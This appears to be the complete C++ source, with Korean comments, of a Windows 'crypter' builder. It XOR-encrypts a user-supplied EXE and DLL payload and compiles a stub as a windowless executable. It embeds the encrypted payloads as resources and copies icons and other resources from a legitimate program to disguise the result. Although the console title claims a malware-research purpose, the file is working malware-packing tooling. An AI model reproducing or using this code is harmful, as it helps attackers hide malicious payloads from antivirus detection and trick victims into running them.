#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <windows.h>
#include <iomanip>

// =================================================================================
// 리소스에서 Stub 데이터를 로드하는 함수 (새로운 기능)
// =================================================================================
std::vector<unsigned char> load_stub_from_resource(const std::string& resource_name) {
    HMODULE hModule = GetModuleHandle(NULL); // 현재 프로세스(빌더)의 핸들을 가져옵니다.
    // "BIN" 타입의 리소스를 찾습니다.
    HRSRC hRes = FindResourceA(hModule, resource_name.c_str(), "BIN");
    if (!hRes) {
        std::cerr << "Error: Cannot find resource '" << resource_name << "'." << std::endl;
        return {};
    }
    HGLOBAL hResLoad = LoadResource(hModule, hRes);
    if (!hResLoad) {
        std::cerr << "Error: Cannot load resource '" << resource_name << "'." << std::endl;
        return {};
    }
    LPVOID lpResLock = LockResource(hResLoad);
    if (!lpResLock) {
        std::cerr << "Error: Cannot lock resource '" << resource_name << "'." << std::endl;
        return {};
    }
    DWORD dwSize = SizeofResource(hModule, hRes);
    if (dwSize == 0) {
        return {};
    }
    // 리소스 데이터를 vector<unsigned char> 형태로 복사하여 반환합니다.
    const unsigned char* pData = static_cast<const unsigned char*>(lpResLock);
    return std::vector<unsigned char>(pData, pData + dwSize);
}


// =================================================================================
// Builder 로직 시작
// =================================================================================

std::vector<unsigned char> read_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Error: Cannot open file " << filename << std::endl;
        return {};
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> buffer(size);
    if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        return buffer;
    }
    return {};
}

void xor_crypt(std::vector<unsigned char>& data) {
    const char key[] = "mysecretkey";
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % (sizeof(key) - 1)];
    }
}

// =================================================================================
// 리소스 복제 로직 (기존과 동일)
// =================================================================================

struct EnumResInfo {
    HANDLE hUpdate;
};

BOOL CALLBACK EnumResNameProcA(HMODULE hModule, LPCSTR lpType, LPSTR lpName, LONG_PTR lParam) {
    EnumResInfo* info = (EnumResInfo*)lParam;
    HRSRC hRes = FindResourceA(hModule, lpName, lpType);
    if (hRes) {
        HGLOBAL hResLoad = LoadResource(hModule, hRes);
        if (hResLoad) {
            LPVOID lpResLock = LockResource(hResLoad);
            if (lpResLock) {
                DWORD dwSize = SizeofResource(hModule, hRes);
                if (!UpdateResourceA(info->hUpdate, lpType, lpName, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), lpResLock, dwSize)) {
                    std::cerr << "Could not update resource. Error: " << GetLastError() << std::endl;
                }
            }
        }
    }
    return TRUE;
}

BOOL CALLBACK EnumResTypeProcA(HMODULE hModule, LPSTR lpType, LONG_PTR lParam) {
    EnumResourceNamesA(hModule, lpType, EnumResNameProcA, lParam);
    return TRUE;
}

bool copy_resources(const std::string& source_path, const std::string& dest_path) {
    HMODULE hLib = LoadLibraryExA(source_path.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hLib) {
        std::cerr << "Error: Could not load source file for resources: " << source_path << std::endl;
        return false;
    }

    EnumResInfo info;
    info.hUpdate = BeginUpdateResourceA(dest_path.c_str(), FALSE);
    if (!info.hUpdate) {
        std::cerr << "Error: Could not open destination file for resource update: " << dest_path << std::endl;
        FreeLibrary(hLib);
        return false;
    }

    EnumResourceTypesA(hLib, EnumResTypeProcA, (LONG_PTR)&info);

    FreeLibrary(hLib);

    if (!EndUpdateResourceA(info.hUpdate, FALSE)) {
        std::cerr << "Error: Could not write resources to destination file. Error: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

// =================================================================================
// 페이로드를 리소스로 추가하는 함수 (기존과 동일)
// =================================================================================
bool add_payload_as_resource(const std::string& target_exe, int resource_id, const std::vector<unsigned char>& payload_data) {
    HANDLE hUpdate = BeginUpdateResourceA(target_exe.c_str(), FALSE);
    if (hUpdate == NULL) {
        std::cerr << "Error: Could not open file for resource update: " << target_exe << " (Error " << GetLastError() << ")" << std::endl;
        return false;
    }

    // "BIN"은 사용자 정의 리소스 타입을 의미합니다.
    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(resource_id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)payload_data.data(), payload_data.size())) {
        std::cerr << "Error: Could not add resource to file. (Error " << GetLastError() << ")" << std::endl;
        EndUpdateResourceA(hUpdate, TRUE); // 실패 시 변경 취소
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        std::cerr << "Error: Could not write resource to file. (Error " << GetLastError() << ")" << std::endl;
        return false;
    }
    return true;
}


int main() {
    std::string proj_exe, payload_dll, temp_exe, out_path;

    SetConsoleTitleA("Malware Analysis and Demonstration Research Crypter");

    std::cout << "--- C++ Crypter For Malware Analysis ---\n";
    std::cout << "Enter path for my_proj.exe: ";
    std::getline(std::cin, proj_exe);
    std::cout << "Enter path for my_payload.dll: ";
    std::getline(std::cin, payload_dll);
    std::cout << "Enter path for my_temp.exe (for resources): ";
    std::getline(std::cin, temp_exe);
    std::cout << "Enter output file path (e.g., C:\\path\\to\\Export.exe): ";
    std::getline(std::cin, out_path);

    // 1. 파일 읽기
    std::cout << "\n[1] Reading payload files...\n";
    auto exe_bytes = read_file(proj_exe);
    auto dll_bytes = read_file(payload_dll);

    if (exe_bytes.empty() || dll_bytes.empty()) {
        std::cerr << "Failed to read one or more payload files. Aborting.\n";
        system("pause");
        return 1;
    }
    std::cout << "    - " << proj_exe << " (" << exe_bytes.size() << " bytes)\n";
    std::cout << "    - " << payload_dll << " (" << dll_bytes.size() << " bytes)\n";

    // 2. 암호화
    std::cout << "[2] Encrypting payloads...\n";
    xor_crypt(exe_bytes);
    xor_crypt(dll_bytes);
    std::cout << "    - Encryption complete.\n";

    // 3. 리소스에서 Stub 코드 로드
    std::cout << "[3] Loading stub from resource...\n";
    auto stub_bytes = load_stub_from_resource("STUB_PAYLOAD");
    if (stub_bytes.empty()) {
        std::cerr << "Failed to load stub payload from resource. Aborting.\n";
        system("pause");
        return 1;
    }
    std::string stub_code(stub_bytes.begin(), stub_bytes.end());
    std::cout << "    - Stub loaded successfully (" << stub_bytes.size() << " bytes)\n";

    // 4. Stub 소스 파일 생성
    std::cout << "[4] Generating stub source file...\n";
    std::string stub_filename = "_stub_temp.cpp";
    std::ofstream stub_file(stub_filename);
    if (!stub_file) {
        std::cerr << "Error: Could not create temporary stub file.\n";
        system("pause");
        return 1;
    }
    stub_file << stub_code;
    stub_file.close();
    std::cout << "    - Stub source saved to " << stub_filename << "\n";

    // 5. Stub 컴파일
    std::cout << "[5] Compiling stub (requires cl.exe in PATH)...\n";
    std::string temp_output_exe = "_temp_export.exe";
    std::string compile_command = "cl.exe /nologo /O2 /EHsc /Fe" + temp_output_exe + " " + stub_filename + " /link /SUBSYSTEM:WINDOWS";

    int result = system(compile_command.c_str());
    if (result != 0) {
        std::cerr << "Error: Compilation failed. Make sure cl.exe is in your PATH.\n";
        remove(stub_filename.c_str());
        system("pause");
        return 1;
    }
    std::cout << "    - Stub compiled successfully to " << temp_output_exe << "\n";

    // 임시 소스 파일 삭제
    remove(stub_filename.c_str());

    // 6. 페이로드를 리소스로 추가
    std::cout << "[6] Injecting payloads into stub's resources...\n";
    if (!add_payload_as_resource(temp_output_exe, 101, exe_bytes)) { // EXE_PAYLOAD ID = 101
        std::cerr << "Error: Failed to inject EXE payload.\n";
        remove(temp_output_exe.c_str());
        system("pause");
        return 1;
    }
    if (!add_payload_as_resource(temp_output_exe, 102, dll_bytes)) { // DLL_PAYLOAD ID = 102
        std::cerr << "Error: Failed to inject DLL payload.\n";
        remove(temp_output_exe.c_str());
        system("pause");
        return 1;
    }
    std::cout << "    - Payloads injected successfully.\n";

    // 7. 아이콘 등 기존 리소스 복제
    std::cout << "[7] Cloning resources from " << temp_exe << "...\n";
    if (!copy_resources(temp_exe, temp_output_exe)) {
        std::cerr << "Error: Failed to clone resources.\n";
        remove(temp_output_exe.c_str());
        system("pause");
        return 1;
    }
    std::cout << "    - Resources cloned successfully.\n";

    // 8. 최종 파일 이동 및 정리
    std::cout << "[8] Finalizing output file...\n";
    if (MoveFileExA(temp_output_exe.c_str(), out_path.c_str(), MOVEFILE_REPLACE_EXISTING) == 0) {
        std::cerr << "Error: Could not move temp file to final destination. Manually move " << temp_output_exe << " to " << out_path << "\n";
    }
    else {
        std::cout << "    - Success! Final file created at: " << out_path << "\n";
    }

    std::cout << "\nOperation completed.\n";
    system("pause");

    return 0;
}